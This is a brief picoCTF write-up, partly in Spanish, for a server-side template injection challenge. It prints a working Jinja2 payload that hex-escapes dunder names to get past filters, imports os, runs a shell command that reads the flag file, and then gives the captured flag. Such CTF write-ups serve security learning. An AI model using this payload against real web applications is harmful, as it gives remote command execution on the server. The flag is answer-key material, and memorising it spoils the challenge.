#### Description
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:54188/)!
#### Hints 
- What does a SQL database contain?
- Server Side Template Injection


```
insertamos la sig inyeccion sacada de la pagina: 


{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}


y ya nos da la bandera

# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}
```

